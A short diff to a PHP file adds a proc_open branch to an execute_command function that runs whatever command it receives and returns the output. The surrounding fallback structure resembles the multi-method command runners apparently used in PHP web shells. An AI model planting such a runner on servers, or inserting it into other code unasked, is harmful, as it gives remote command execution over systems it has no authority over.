@@ -50,6 +50,24 @@ function execute_command($command)
         case 'exec':
             return @exec($command);
 
+        case 'proc_open':
+            $descriptors = array(
+                0 => array('pipe', 'r'),
+                1 => array('pipe', 'w'),
+                2 => array('pipe', 'w')
+            );
+
+            $process = proc_open($command . ' 2>&1', $descriptors, $pipes, getcwd());
+
+            fclose($pipes[0]);
+            $output = stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+            $error = stream_get_contents($pipes[2]);
+            fclose($pipes[2]);
+            $code = proc_close($process);
+
+            return $output;
+
         default:
             return 'None available function to run your command, sorry. :(';
     }
